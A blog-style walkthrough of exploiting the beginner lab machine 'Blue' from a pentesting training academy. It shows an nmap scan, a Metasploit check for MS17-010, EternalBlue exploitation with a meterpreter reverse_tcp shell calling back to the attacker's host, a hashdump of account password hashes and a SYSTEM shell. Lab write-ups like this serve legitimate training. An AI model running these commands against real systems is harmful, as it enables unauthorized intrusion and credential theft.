---
title: "Exploiting the Blue Machine - TCM-SEC Academy"
date: 2024-07-14T13:25:00+06:00
draft: false
tags: ["tcmsec", "hacking", "pentesting"]
categories: ["Write-ups"]
---

In this walkthrough, I'll be detailing the steps I took to exploit and gain root access to a vulnerable machine named "Blue" from the TCM-SEC Academy. This machine, rated as beginner-level, provides an excellent opportunity to practice fundamental penetration testing skills using tools like Nmap and Metasploit. Let's dive in!


## Machine Information
```
Name: Blue
IP: 192.168.208.128
Difficulty: Beginner
```
## Scanning and Enumeration
### Nmap Scan
First, I performed a comprehensive Nmap scan to identify open ports and services running on the target machine.  
  
` sudo nmap -T4 -p- -A 192.168.208.128 `  
  
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ nmap -T4 -A -p- 192.168.208.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 22:35 EDT
Nmap scan report for 192.168.208.128
Host is up (0.00079s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 12h19m59s, deviation: 2h18m34s, median: 10h59m58s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:a9:4e:ca (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-14T09:37:26-04:00
| smb2-time: 
|   date: 2024-07-14T13:37:26
|_  start_date: 2024-07-14T13:29:53
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.84 seconds
                                                                                                                           
```

#### Ports and Info
> 135/tcp   open  msrpc        Microsoft Windows RPC  
> 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn  
> 445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
> 49152/tcp open  msrpc        Microsoft Windows RPC  
> 49153/tcp open  msrpc        Microsoft Windows RPC  
> 49154/tcp open  msrpc        Microsoft Windows RPC  
> 49155/tcp open  msrpc        Microsoft Windows RPC  
> 49156/tcp open  msrpc        Microsoft Windows RPC  
> Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows  

### Researching Potential Vulnerabilities  
Given the services running on the target machine, particularly SMB, I researched potential vulnerabilities in Windows 7 Ultimate 7601 Service Pack 1. SMB is known to be vulnerable to the EternalBlue exploit (MS17-010).  

      
![image](/writeups/blue-tcm/blue_1.jpg)  

#### Check for EternalBlue
Using Metasploit, I checked if the target was vulnerable to EternalBlue 
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ msfconsole
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.208.128
rhosts => 192.168.208.128
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.208.128:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.208.128:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > 

```
> The scan results indicated that the host is likely vulnerable to MS17-010.  

## Exploitation
### Gaining ROOT with Metasploit
Next, I used Metasploit to exploit the EternalBlue vulnerability and gain root access.
```
┌──(psychic㉿0xShakhawat)-[~]
└─$ msfconsole
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
Using `exploit/windows/smb/ms17_010_eternalblue`
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
The default payload is windows/x64/meterpreter/reverse_tcp. I proceeded with the default payload.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.208.128
rhosts => 192.168.208.128
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.208.139:4444 
[*] 192.168.208.128:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.208.128:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.208.128:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.208.128:445 - The target is vulnerable.
[*] 192.168.208.128:445 - Connecting to target for exploitation.
[+] 192.168.208.128:445 - Connection established for exploitation.
[+] 192.168.208.128:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.208.128:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.208.128:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.208.128:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.208.128:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.208.128:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.208.128:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.208.128:445 - Sending all but last fragment of exploit packet
[*] 192.168.208.128:445 - Starting non-paged pool grooming
[+] 192.168.208.128:445 - Sending SMBv2 buffers
[+] 192.168.208.128:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.208.128:445 - Sending final SMBv2 buffers.
[*] 192.168.208.128:445 - Sending last fragment of exploit packet!
[*] 192.168.208.128:445 - Receiving response from exploit packet
[+] 192.168.208.128:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.208.128:445 - Sending egg to corrupted connection.
[*] 192.168.208.128:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.208.128
[*] Meterpreter session 1 opened (192.168.208.139:4444 -> 192.168.208.128:49157) at 2024-07-14 02:33:03 -0400
[+] 192.168.208.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.208.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.208.128:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
meterpreter >
```

I successfully gained a **meterpreter** session, indicating successful exploitation.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
meterpreter > shell
Process 868 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
WIN-845Q99OO4PP

C:\Windows\system32>

```

![image](/writeups/blue-tcm/blue_2.jpg)  

I successfully rooted this machine.  
  